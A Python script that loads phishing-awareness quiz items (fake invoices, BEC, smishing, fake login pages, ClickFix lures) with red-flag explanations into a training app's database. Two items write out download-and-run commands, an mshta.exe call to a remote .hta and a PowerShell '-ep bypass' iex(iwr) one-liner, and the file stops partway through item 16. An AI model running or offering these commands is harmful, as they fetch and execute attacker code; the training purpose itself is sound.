# -*- coding: utf-8 -*-
"""
Script thêm 20 kịch bản phishing mới vào database hiện có.
Chạy: python add_questions.py
"""
import sys
import os
sys.stdout.reconfigure(encoding="utf-8")

# Đảm bảo import đúng app context
sys.path.insert(0, os.path.dirname(__file__))

from app import app
from models import db, Question

NEW_QUESTIONS = [
    # ── 1 ── File đính kèm độc hại (VI) ─────────────────────────────────────
    {
        "title": "Email hoá đơn có file đính kèm độc hại",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">Từ:</span> <span class="value">ketoan@cungcap-xanh.com</span></div>
    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Hoá đơn tháng 12/2024 - Vui lòng xác nhận</span></div>
  </div>
  <div class="email-body">
    <p>Kính gửi Phòng Kế toán,</p>
    <p>Đính kèm hoá đơn tháng 12/2024 theo hợp đồng số HĐ-2024-0891. Vui lòng ký xác nhận và gửi lại trước <strong>31/12/2024</strong>.</p>
    <div style="border:1px solid #ddd;border-radius:6px;padding:12px;margin:12px 0;background:#f9f9f9;display:flex;align-items:center;gap:12px">
      <span style="font-size:28px">📎</span>
      <div>
        <div style="font-weight:600">HoaDon_T12_2024.pdf.exe</div>
        <div style="font-size:12px;color:#888">2.4 MB · Nhấn để mở</div>
      </div>
    </div>
    <a href="#" onclick="return false;" style="background:#0078d4;color:white;padding:8px 18px;text-decoration:none;border-radius:4px;display:inline-block">Tải xuống &amp; Xác nhận</a>
    <p style="margin-top:12px">Trân trọng,<br>Phòng Kế toán — Công ty Cung Cấp Xanh</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là email PHISHING phát tán mã độc qua file đính kèm giả. Dấu hiệu: (1) Tên file 'HoaDon_T12_2024.pdf.exe' — phần mở rộng thật là .exe (chương trình thực thi), không phải PDF. (2) Domain người gửi không quen thuộc, không phải nhà cung cấp nội bộ đã xác nhận. (3) Không bao giờ mở file .exe, .bat, .vbs, .js nhận từ email — đây là vector phát tán ransomware phổ biến nhất. Báo cáo ngay cho bộ phận IT.",
    },

    # ── 2 ── ClickFix / mshta.exe LOTL (EN) ─────────────────────────────────
    {
        "title": "Fake CAPTCHA instructing mshta.exe (ClickFix)",
        "scenario_type": "text",
        "content": """<div style="font-family:Arial,sans-serif;max-width:480px;margin:auto;border:1px solid #ddd;border-radius:8px;overflow:hidden">
  <div style="background:#4285f4;color:white;padding:14px 20px;font-size:16px;font-weight:600">
    🔒 Security Verification Required
  </div>
  <div style="padding:20px">
    <p style="margin-top:0">Our system detected unusual activity. Please complete the verification below to continue.</p>
    <div style="border:2px dashed #ccc;border-radius:6px;padding:16px;text-align:center;margin:12px 0;background:#fafafa">
      <div style="font-size:32px;margin-bottom:8px">🤖</div>
      <div style="font-weight:600;margin-bottom:4px">I'm not a robot</div>
      <div style="font-size:12px;color:#666">reCAPTCHA</div>
    </div>
    <p style="font-size:14px;color:#333"><strong>To verify your identity, follow these steps:</strong></p>
    <ol style="font-size:13px;color:#444;padding-left:18px;line-height:2">
      <li>Press <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc">Win</kbd> + <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc">R</kbd></li>
      <li>Paste the command below into the Run dialog</li>
      <li>Press <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc">Enter</kbd></li>
    </ol>
    <div style="background:#1e1e1e;color:#d4d4d4;padding:10px 14px;border-radius:4px;font-family:monospace;font-size:13px;word-break:break-all;margin-bottom:10px">
      mshta.exe https://verify-captcha-cdn.net/v.hta
    </div>
    <button onclick="return false;" style="width:100%;background:#34a853;color:white;padding:10px;border:none;border-radius:4px;font-size:14px;cursor:pointer">
      ✔ I have completed the steps — Continue
    </button>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "This is a ClickFix PHISHING attack using Living-off-the-Land (LOTL) technique. Red flags: (1) Legitimate CAPTCHAs never ask you to run commands manually — real reCAPTCHA works entirely in the browser. (2) mshta.exe is a built-in Windows utility abused here to download and run a remote .hta script from an attacker-controlled server. (3) This bypasses antivirus because it uses a signed Windows binary. (4) Executing the command installs malware silently. Never run commands from a webpage — close the tab immediately and report to IT.",
    },

    # ── 3 ── CEO Fraud / BEC (VI) ────────────────────────────────────────────
    {
        "title": "CEO Fraud — yêu cầu chuyển tiền khẩn cấp",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">Từ:</span> <span class="value">nguyen.van.tong.giam.doc@gmail.com</span></div>
    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Gấp - Cần thực hiện ngay trước 15:00 hôm nay</span></div>
  </div>
  <div class="email-body">
    <p>Tôi đang trong cuộc họp với đối tác chiến lược, không thể nghe máy.</p>
    <p>Cần anh/chị <strong>chuyển khoản ngay 485.000.000đ</strong> đến tài khoản sau để hoàn tất hợp đồng M&amp;A trước thời hạn:</p>
    <div style="background:#f5f5f5;border-left:4px solid #e53935;padding:12px;margin:12px 0;font-size:14px">
      <div><strong>Ngân hàng:</strong> Techcombank</div>
      <div><strong>Số tài khoản:</strong> 19037XXXXXX</div>
      <div><strong>Chủ tài khoản:</strong> NGUYEN THANH LONG</div>
      <div><strong>Nội dung:</strong> TT hop dong 2024-HĐ-0912</div>
    </div>
    <p style="color:red;font-weight:bold">⚠️ Bảo mật tuyệt đối — không thông báo cho bất kỳ ai khác. Xác nhận lại qua email ngay khi chuyển xong.</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là tấn công BEC (Business Email Compromise) — giả mạo CEO. Dấu hiệu: (1) Email CEO thật dùng domain công ty, không phải @gmail.com. (2) Yêu cầu 'bảo mật tuyệt đối, không báo ai' — nhằm cô lập nạn nhân và ngăn xác minh. (3) Áp lực thời gian gấp (trước 15:00). (4) Mọi giao dịch tài chính lớn đều cần quy trình phê duyệt nội bộ. Luôn xác minh qua gọi điện trực tiếp cho CEO trước khi thực hiện bất kỳ chuyển khoản nào.",
    },

    # ── 4 ── Fake Microsoft 365 Login Page (EN) ──────────────────────────────
    {
        "title": "Fake Microsoft 365 login portal",
        "scenario_type": "text",
        "content": """<div style="font-family:'Segoe UI',Arial,sans-serif;max-width:440px;margin:auto;border:1px solid #ddd;padding:30px;border-radius:4px">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/240px-Microsoft_logo.svg.png" alt="Microsoft" style="height:22px;margin-bottom:24px;pointer-events:none">
  <h2 style="font-size:22px;font-weight:400;margin:0 0 20px">Sign in</h2>
  <div style="font-size:13px;color:#666;margin-bottom:16px">URL: <code style="background:#f0f0f0;padding:2px 6px;border-radius:3px">microsoft-365-login.auth-verify.com/signin</code></div>
  <input type="email" placeholder="Email, phone, or Skype" value="__USER_EMAIL__" readonly style="width:100%;padding:8px 10px;border:1px solid #666;border-radius:2px;font-size:15px;box-sizing:border-box;margin-bottom:12px">
  <input type="password" placeholder="Password" style="width:100%;padding:8px 10px;border:1px solid #666;border-radius:2px;font-size:15px;box-sizing:border-box;margin-bottom:16px">
  <button onclick="return false;" style="background:#0067b8;color:white;border:none;padding:6px 20px;font-size:15px;cursor:pointer;border-radius:2px">Next</button>
  <p style="margin-top:20px;font-size:13px"><a href="#" onclick="return false;" style="color:#0067b8">Can't access your account?</a></p>
</div>""",
        "is_phishing": True,
        "explanation": "This is a PHISHING page mimicking Microsoft 365 login. Red flags: (1) The URL is 'microsoft-365-login.auth-verify.com' — legitimate Microsoft login is 'login.microsoftonline.com'. (2) The site uses a lookalike domain to steal credentials. (3) Any credentials entered are sent directly to attackers. Always check the address bar before entering passwords. Use a password manager — it will not autofill on fake sites.",
    },

    # ── 5 ── Smishing / SMS OTP (VI) ─────────────────────────────────────────
    {
        "title": "SMS giả mạo ngân hàng BIDV yêu cầu OTP",
        "scenario_type": "text",
        "content": """<div style="font-family:Arial,sans-serif;max-width:380px;margin:auto">
  <div style="background:#1a1a2e;color:white;border-radius:20px 20px 0 0;padding:12px 16px;font-size:13px;display:flex;align-items:center;gap:8px">
    <span style="background:#25d366;border-radius:50%;width:32px;height:32px;display:flex;align-items:center;justify-content:center">📱</span>
    <span><strong>BIDV-BANK</strong></span>
  </div>
  <div style="background:#f5f5f5;border-radius:0 0 20px 20px;padding:16px">
    <div style="background:white;border-radius:16px 16px 4px 16px;padding:12px 14px;font-size:14px;margin-bottom:8px">
      <p style="margin:0 0 8px"><strong>[BIDV]</strong> Tai khoan cua ban vua dang nhap tu thiet bi la tai Ha Noi. Neu khong phai ban, bam vao link de chan ngay:</p>
      <a href="#" onclick="return false;" style="color:#0070f3;word-break:break-all">http://bidv-xacminh.net/chan-truy-cap?uid=XX8821</a>
      <p style="margin:8px 0 0;color:#888;font-size:11px">09:47</p>
    </div>
    <p style="font-size:12px;color:#e53935;text-align:center;margin:8px 0 0">⚠️ Cảnh báo bảo mật — Xác minh ngay</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là tấn công Smishing (SMS Phishing) giả mạo BIDV. Dấu hiệu: (1) BIDV liên lạc chính thức qua số ngắn đã đăng ký (1800 1xx), không phải tên hiển thị tuỳ ý. (2) Domain 'bidv-xacminh.net' là giả — BIDV dùng 'bidv.com.vn'. (3) Link dẫn đến trang thu thập OTP và thông tin thẻ. (4) Ngân hàng thật không gửi link chặn truy cập qua SMS. Gọi trực tiếp hotline BIDV 1900 9247 nếu nghi ngờ.",
    },

    # ── 6 ── Fake SharePoint file share (EN) ─────────────────────────────────
    {
        "title": "Fake SharePoint document share notification",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">From:</span> <span class="value">no-reply@sharepoint-docshare.net</span></div>
    <div class="email-field"><span class="label">To:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Subject:</span> <span class="value">Michael Chen shared "Q4_Financial_Report_FINAL.xlsx" with you</span></div>
  </div>
  <div class="email-body">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg/240px-Microsoft_Office_SharePoint_%282019%E2%80%93present%29.svg.png" alt="SharePoint" style="height:20px;pointer-events:none">
      <span style="font-size:13px;color:#666">Microsoft SharePoint</span>
    </div>
    <p><strong>Michael Chen</strong> shared a file with you.</p>
    <div style="border:1px solid #ddd;border-radius:6px;padding:12px;margin:12px 0;display:flex;align-items:center;gap:12px;background:#f9f9f9">
      <span style="font-size:32px">📊</span>
      <div>
        <div style="font-weight:600;color:#0078d4">Q4_Financial_Report_FINAL.xlsx</div>
        <div style="font-size:12px;color:#888">Excel Workbook · 1.8 MB</div>
      </div>
    </div>
    <a href="#" onclick="return false;" style="background:#0078d4;color:white;padding:9px 20px;text-decoration:none;border-radius:4px;display:inline-block">Open in SharePoint</a>
    <p style="color:#888;font-size:11px;margin-top:16px">Microsoft Corporation | One Microsoft Way, Redmond, WA</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "This is a PHISHING email impersonating Microsoft SharePoint. Red flags: (1) The sender domain is 'sharepoint-docshare.net' — legitimate SharePoint notifications come from '@microsoft.com' or your company's own SharePoint domain. (2) Clicking 'Open in SharePoint' redirects to a fake login page to steal Microsoft 365 credentials. (3) Be suspicious of unexpected file shares, even from known names — the sender may be spoofed. Verify with the sender directly via Teams or phone.",
    },

    # ── 7 ── QR Code Phishing / Quishing (VI) ────────────────────────────────
    {
        "title": "Email QR code giả mạo cổng HR nội bộ",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">Từ:</span> <span class="value">hr-portal@hrsystem-portal.net</span></div>
    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Xác nhận đánh giá KPI Q4 — Hạn chót 20/12</span></div>
  </div>
  <div class="email-body">
    <p>Kính gửi,</p>
    <p>Hệ thống HR yêu cầu bạn hoàn thành đánh giá KPI Q4 trước <strong>20/12/2024</strong>. Vui lòng quét mã QR bên dưới bằng điện thoại để đăng nhập an toàn hơn:</p>
    <div style="text-align:center;margin:16px 0">
      <div style="display:inline-block;padding:12px;border:2px solid #333;border-radius:8px;background:white">
        <div style="width:120px;height:120px;background:repeating-linear-gradient(0deg,#000 0px,#000 8px,#fff 8px,#fff 16px),repeating-linear-gradient(90deg,#000 0px,#000 8px,#fff 8px,#fff 16px);opacity:0.85"></div>
      </div>
      <p style="font-size:12px;color:#888;margin-top:8px">Quét bằng camera điện thoại</p>
    </div>
    <p style="font-size:13px;color:#555">Lưu ý: Link chỉ hoạt động trên thiết bị di động. Hạn đăng nhập: 23:59 ngày 20/12/2024.</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là tấn công Quishing (QR Code Phishing). Dấu hiệu: (1) Domain 'hrsystem-portal.net' không phải hệ thống HR chính thức của công ty. (2) QR code dẫn đến trang giả mạo — tấn công này dùng QR để vượt qua bộ lọc link trong email. (3) Yêu cầu 'chỉ dùng di động' nhằm tránh kiểm tra URL trên máy tính. (4) Hệ thống HR thật không yêu cầu quét QR qua email bất ngờ. Gõ trực tiếp địa chỉ hệ thống HR vào trình duyệt thay vì quét QR.",
    },

    # ── 8 ── Fake HR salary update (VI) ──────────────────────────────────────
    {
        "title": "Email giả HR yêu cầu cập nhật thông tin lương",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">Từ:</span> <span class="value">luong@nhan-su-portal.com</span></div>
    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Cập nhật thông tin tài khoản nhận lương trước 25/12</span></div>
  </div>
  <div class="email-body">
    <p>Kính gửi,</p>
    <p>Phòng Nhân sự thông báo: hệ thống thanh toán lương sẽ <strong>nâng cấp lên nền tảng mới</strong> từ tháng 01/2025.</p>
    <p>Để đảm bảo lương tháng 01 được chuyển đúng hạn, vui lòng <strong>cập nhật thông tin tài khoản ngân hàng và số CCCD</strong> trước ngày 25/12/2024:</p>
    <a href="#" onclick="return false;" style="background:#e53935;color:white;padding:10px 22px;text-decoration:none;border-radius:4px;display:inline-block;margin:10px 0;font-weight:bold">Cập nhật ngay →</a>
    <p style="color:#e53935;font-size:13px">⚠️ Nếu không cập nhật, lương tháng 01 có thể bị trì hoãn.</p>
    <p>Phòng Nhân sự</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là email PHISHING giả mạo phòng Nhân sự. Dấu hiệu: (1) Domain 'nhan-su-portal.com' không phải domain công ty. (2) Yêu cầu cung cấp số CCCD và thông tin ngân hàng qua link ngoài — HR thật dùng hệ thống nội bộ đã xác thực. (3) Đe dọa trì hoãn lương để tạo áp lực. Kiểm tra với phòng HR qua email nội bộ hoặc gặp trực tiếp trước khi cung cấp bất kỳ thông tin cá nhân nào.",
    },

    # ── 9 ── Fake DocuSign (EN) ───────────────────────────────────────────────
    {
        "title": "Fake DocuSign signature request",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">From:</span> <span class="value">dse@docusign-secure-document.com</span></div>
    <div class="email-field"><span class="label">To:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Subject:</span> <span class="value">Please DocuSign: Employment_Contract_Amendment_2025.pdf</span></div>
  </div>
  <div class="email-body">
    <div style="text-align:center;margin-bottom:16px">
      <div style="background:#ffb300;color:white;padding:6px 14px;border-radius:20px;font-weight:bold;display:inline-block;font-size:13px">DOCUSIGN</div>
    </div>
    <p><strong>HR Department</strong> sent you a document to review and sign.</p>
    <div style="border:1px solid #ddd;border-radius:6px;padding:14px;margin:12px 0;background:#fffbf0">
      <div style="font-weight:600">📄 Employment_Contract_Amendment_2025.pdf</div>
      <div style="font-size:12px;color:#888;margin-top:4px">Deadline: December 31, 2024 · Please sign at your earliest convenience</div>
    </div>
    <a href="#" onclick="return false;" style="background:#ffb300;color:white;padding:10px 24px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold">REVIEW DOCUMENT</a>
    <p style="font-size:11px;color:#aaa;margin-top:16px">DocuSign, Inc. · 221 Main Street, San Francisco, CA</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "This is a PHISHING email impersonating DocuSign. Red flags: (1) Sender domain is 'docusign-secure-document.com' — legitimate DocuSign uses '@docusign.com' or '@docusign.net'. (2) 'REVIEW DOCUMENT' leads to a fake login page to steal your Microsoft or Google credentials. (3) Always go directly to docusign.com and check your inbox there instead of clicking email links. Contact HR directly to verify if a real contract amendment was sent.",
    },

    # ── 10 ── ClickFix PowerShell / fake browser update (EN) ─────────────────
    {
        "title": "Fake browser update prompting PowerShell command",
        "scenario_type": "text",
        "content": """<div style="font-family:Arial,sans-serif;max-width:500px;margin:auto;border:1px solid #ddd;border-radius:8px;overflow:hidden">
  <div style="background:#1a73e8;color:white;padding:12px 16px;font-size:15px;font-weight:600;display:flex;align-items:center;gap:8px">
    <span style="font-size:20px">🔵</span> Google Chrome — Critical Update Required
  </div>
  <div style="padding:20px">
    <p style="margin-top:0;color:#c62828;font-weight:bold">⚠️ Your browser is out of date and may be vulnerable to attacks.</p>
    <p style="font-size:14px">Chrome could not update automatically due to a Group Policy restriction. To apply the security patch manually:</p>
    <ol style="font-size:13px;color:#333;padding-left:16px;line-height:2.2">
      <li>Open <strong>PowerShell</strong> (search in Start Menu)</li>
      <li>Copy and paste the command below</li>
      <li>Press <kbd style="background:#eee;padding:2px 6px;border-radius:3px;border:1px solid #ccc">Enter</kbd> to apply the update</li>
    </ol>
    <div style="background:#1e1e1e;color:#9cdcfe;padding:12px;border-radius:4px;font-family:monospace;font-size:12px;word-break:break-all;margin-bottom:12px">
      powershell -ep bypass -c "iex(iwr 'https://chrome-patch.update-cdn.net/fix.ps1' -UseBasicParsing)"
    </div>
    <button onclick="return false;" style="width:100%;background:#1a73e8;color:white;padding:10px;border:none;border-radius:4px;font-size:14px;cursor:pointer">Update Complete — Click to Continue</button>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "This is a ClickFix PHISHING attack using PowerShell as a Living-off-the-Land technique. Red flags: (1) Chrome and all browsers update silently through their own built-in updater — they never ask you to run PowerShell commands. (2) The command uses '-ep bypass' to disable PowerShell's execution policy safety check, then downloads and runs an attacker-controlled script. (3) This technique is used to deploy infostealers (RedLine, Lumma) and remote access trojans. Close the page immediately and report to IT.",
    },

    # ── 11 ── Legitimate HR holiday notice (VI) — LEGITIMATE ─────────────────
    {
        "title": "Thông báo lịch nghỉ Tết Nguyên Đán 2025",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">Từ:</span> <span class="value">hr@congty.com.vn</span></div>
    <div class="email-field"><span class="label">Đến:</span> <span class="value">all-staff@congty.com.vn</span></div>
    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Thông báo: Lịch nghỉ Tết Nguyên Đán 2025</span></div>
  </div>
  <div class="email-body">
    <p>Kính gửi toàn thể cán bộ nhân viên,</p>
    <p>Ban Giám đốc thông báo lịch nghỉ Tết Nguyên Đán Ất Tỵ 2025:</p>
    <ul>
      <li><strong>Nghỉ từ:</strong> Thứ Năm, 23/01/2025 (28 tháng Chạp)</li>
      <li><strong>Đi làm trở lại:</strong> Thứ Hai, 03/02/2025 (mùng 6 tháng Giêng)</li>
      <li><strong>Tổng cộng:</strong> 11 ngày (bao gồm thứ Bảy, Chủ nhật)</li>
    </ul>
    <p>Các bộ phận cần bố trí trực Tết vui lòng liên hệ quản lý trực tiếp.</p>
    <p>Chúc toàn thể cán bộ nhân viên và gia đình một năm mới an khang, thịnh vượng!</p>
    <p>Trân trọng,<br><strong>Phòng Nhân sự</strong><br>ĐT nhánh: 1001 | hr@congty.com.vn</p>
  </div>
</div>""",
        "is_phishing": False,
        "explanation": "Đây là email HỢP LỆ từ phòng Nhân sự. Dấu hiệu bình thường: (1) Gửi từ domain chính thức của công ty '@congty.com.vn'. (2) Gửi đến danh sách nội bộ 'all-staff', không nhắm riêng một cá nhân. (3) Nội dung là thông báo hành chính bình thường, không có link bên ngoài hay yêu cầu nhập thông tin. (4) Cung cấp số nhánh điện thoại nội bộ và địa chỉ email để liên hệ.",
    },

    # ── 12 ── Fake IT VPN password reset (VI) ────────────────────────────────
    {
        "title": "Email giả IT yêu cầu đặt lại mật khẩu VPN",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">Từ:</span> <span class="value">it-helpdesk@congty-support.net</span></div>
    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">Hành động cần thiết: Tài khoản VPN của bạn hết hạn trong 24 giờ</span></div>
  </div>
  <div class="email-body">
    <p>Xin chào,</p>
    <p>Hệ thống xác thực VPN phát hiện tài khoản của bạn <strong>sắp hết hạn</strong>. Nếu không gia hạn, bạn sẽ mất kết nối VPN từ ngày mai.</p>
    <div style="background:#fff3e0;border-left:4px solid #ff6f00;padding:12px;margin:12px 0;font-size:14px">
      <strong>Người dùng:</strong> <span style="font-family:monospace">__USER_EMAIL__</span><br>
      <strong>Ngày hết hạn:</strong> Ngày mai, 00:00<br>
      <strong>Trạng thái:</strong> <span style="color:red">Sắp hết hạn</span>
    </div>
    <p>Vui lòng đăng nhập vào cổng tự phục vụ IT để gia hạn ngay:</p>
    <a href="#" onclick="return false;" style="background:#1565c0;color:white;padding:10px 22px;text-decoration:none;border-radius:4px;display:inline-block">Gia hạn VPN ngay</a>
    <p style="font-size:12px;color:#888;margin-top:16px">IT HelpDesk | Ext. 9999 | it-support@congty-support.net</p>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là email PHISHING giả mạo IT HelpDesk. Dấu hiệu: (1) Domain 'congty-support.net' là giả — IT nội bộ dùng domain công ty chính thức. (2) Số nhánh '9999' bất thường — kiểm tra lại số IT thật trong danh bạ nội bộ. (3) Nhấn 'Gia hạn VPN' dẫn đến trang giả thu thập thông tin đăng nhập mạng công ty. (4) IT thật thường gia hạn tài khoản qua hệ thống nội bộ, không cần nhân viên tự làm qua link email.",
    },

    # ── 13 ── Fake GHN delivery SMS (VI) ─────────────────────────────────────
    {
        "title": "SMS giả mạo GHN thông báo giao hàng thất bại",
        "scenario_type": "text",
        "content": """<div style="font-family:Arial,sans-serif;max-width:380px;margin:auto">
  <div style="background:#e53935;color:white;border-radius:16px 16px 0 0;padding:12px 16px;font-size:13px;display:flex;align-items:center;gap:8px">
    <span style="background:white;color:#e53935;border-radius:50%;width:30px;height:30px;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:11px">GHN</span>
    <span><strong>GHN Express</strong></span>
  </div>
  <div style="background:#f5f5f5;border-radius:0 0 16px 16px;padding:16px">
    <div style="background:white;border-radius:12px;padding:14px;font-size:14px">
      <p style="margin:0 0 8px"><strong>[GHN]</strong> Don hang #GHN8821XXXX giao that bai do ban vang mat. Phi luu kho: 15.000d/ngay. Xac nhan lai dia chi giao hang tai:</p>
      <a href="#" onclick="return false;" style="color:#e53935;word-break:break-all;font-size:13px">http://ghn-xacnhan.delivery-vn.net/GHN8821</a>
      <p style="margin:10px 0 0;color:#888;font-size:11px">10:23</p>
    </div>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là Smishing giả mạo GHN. Dấu hiệu: (1) GHN liên hệ qua số chính thức 1900 636 888 và app GHN, không phải tên hiển thị tuỳ ý. (2) Domain 'ghn-xacnhan.delivery-vn.net' không phải 'ghn.vn' chính thức. (3) Phí lưu kho tạo áp lực tài chính buộc click nhanh. (4) Link dẫn đến trang giả yêu cầu thông tin cá nhân hoặc thanh toán thẻ. Tra cứu đơn hàng trực tiếp trên app GHN hoặc website ghn.vn.",
    },

    # ── 14 ── Legitimate GitHub security alert (EN) — LEGITIMATE ──────────────
    {
        "title": "Legitimate GitHub security vulnerability alert",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">From:</span> <span class="value">noreply@github.com</span></div>
    <div class="email-field"><span class="label">To:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Subject:</span> <span class="value">[GitHub] A security vulnerability has been found in your repository</span></div>
  </div>
  <div class="email-body">
    <p>Hi,</p>
    <p>We found a potential security vulnerability in one of your dependencies.</p>
    <div style="border:1px solid #f0c060;border-radius:6px;padding:12px;margin:12px 0;background:#fffbf0">
      <div><strong>Repository:</strong> your-org/internal-api</div>
      <div><strong>Package:</strong> lodash 4.17.15</div>
      <div><strong>Severity:</strong> <span style="color:#e65100;font-weight:bold">High</span> — Prototype Pollution (CVE-2021-23337)</div>
    </div>
    <p>To view and fix this alert, visit your repository's Security tab directly at <strong>github.com</strong>.</p>
    <p style="font-size:12px;color:#888">You're receiving this because you have Dependabot alerts enabled.<br>© 2024 GitHub, Inc. · 88 Colin P Kelly Jr Street, San Francisco, CA</p>
  </div>
</div>""",
        "is_phishing": False,
        "explanation": "This is a LEGITIMATE security alert from GitHub. Normal indicators: (1) Sent from the official '@github.com' domain. (2) Does not contain a clickable link in the email body — instructs you to visit github.com directly. (3) References a specific real CVE and a specific repository you own. (4) GitHub Dependabot alerts follow this exact format. Always verify by logging into github.com independently.",
    },

    # ── 15 ── Fake Tổng cục Thuế tax authority (VI) ──────────────────────────
    {
        "title": "Email giả mạo Tổng cục Thuế yêu cầu truy thu",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">Từ:</span> <span class="value">thongbao@tong-cuc-thue-gov.com</span></div>
    <div class="email-field"><span class="label">Đến:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Tiêu đề:</span> <span class="value">THÔNG BÁO TRUY THU THUẾ — Cần xử lý trong 7 ngày làm việc</span></div>
  </div>
  <div class="email-body">
    <div style="border:2px solid #c62828;border-radius:6px;padding:14px;margin-bottom:14px;background:#fff8f8">
      <div style="font-weight:bold;color:#c62828;font-size:15px;margin-bottom:8px">⚠️ THÔNG BÁO TRUY THU THUẾ THU NHẬP CÁ NHÂN</div>
      <p style="margin:0;font-size:13px">Qua rà soát kỳ tính thuế <strong>2022-2024</strong>, hệ thống phát hiện số thuế TNCN còn thiếu:</p>
    </div>
    <table style="width:100%;font-size:13px;border-collapse:collapse">
      <tr style="background:#f5f5f5"><td style="padding:7px"><strong>Mã số thuế:</strong></td><td style="padding:7px">Theo hồ sơ đã đăng ký</td></tr>
      <tr><td style="padding:7px"><strong>Số tiền truy thu:</strong></td><td style="padding:7px;color:#c62828;font-weight:bold">42.800.000 VNĐ</td></tr>
      <tr style="background:#f5f5f5"><td style="padding:7px"><strong>Thời hạn:</strong></td><td style="padding:7px">7 ngày làm việc kể từ ngày nhận thông báo</td></tr>
    </table>
    <p style="margin-top:14px;font-size:13px">Để tra cứu chi tiết và hoàn thành nghĩa vụ thuế, vui lòng truy cập:</p>
    <a href="#" onclick="return false;" style="background:#c62828;color:white;padding:10px 20px;text-decoration:none;border-radius:4px;display:inline-block">Nộp thuế ngay →</a>
  </div>
</div>""",
        "is_phishing": True,
        "explanation": "Đây là email PHISHING giả mạo Tổng cục Thuế. Dấu hiệu: (1) Cơ quan nhà nước dùng domain '.gov.vn' — địa chỉ 'tong-cuc-thue-gov.com' là giả mạo. (2) Tổng cục Thuế liên hệ qua bưu điện hoặc cổng 'thuedientu.gdt.gov.vn', không phải email cá nhân. (3) Số tiền cụ thể cùng thời hạn 7 ngày tạo áp lực tâm lý. (4) Nút 'Nộp thuế' dẫn đến trang thu thập thông tin ngân hàng. Tra cứu tại thuedientu.gdt.gov.vn hoặc liên hệ cục thuế địa phương.",
    },

    # ── 16 ── Malicious macro Excel attachment (EN) ───────────────────────────
    {
        "title": "Malicious macro-enabled Excel attachment (Q4 report)",
        "scenario_type": "email",
        "content": """<div class="email-mockup">
  <div class="email-header">
    <div class="email-field"><span class="label">From:</span> <span class="value">analytics@business-reports-online.com</span></div>
    <div class="email-field"><span class="label">To:</span> <span class="value">__USER_EMAIL__</span></div>
    <div class="email-field"><span class="label">Subject:</span> <span class="value">Q4 2024 Market Intelligence Report — Action Required</span></div>
  </div>
  <div class="email-body">
    <p>Dear Colleague,</p>
    <p>Please find attached the <strong>Q4 2024 Market Intelligence Report</strong> prepared for your department. The report contains interactive dashboards — please enable macros when prompted to view the full content.</p>
    <div style="border:1px solid #ddd;border-radius:6px;padding:12px;margin:12px 0;background:#f0f8f0;display:flex;align-items:center;gap:12px">
      <span style="font-size:32px">📗</span>
      <div>
        <div style="font-weight:600;color:#1a7431">Q4_Market_Report_2024.xlsm</div>
        <div style="font-size:12px;color:#888">Excel Macro-Enabled Workbook · 3.1 MB</div>
      </div>
    </div>
    <div style="background:#fff3e0;border-left:3px solid #ff8f00;padding:10px;font-size:13px">
      📌 <strong>Note:</strong> When Excel shows a yellow security bar, click <strong>"Enable Content"</strong> to load the interactive charts.
    </div>
    <p style="font-size:12px;color:#888;margin-top:16px">Business Analytics Group | Unsubscribe</p>
  </div>
</div>""",
        "is_phishing": True,
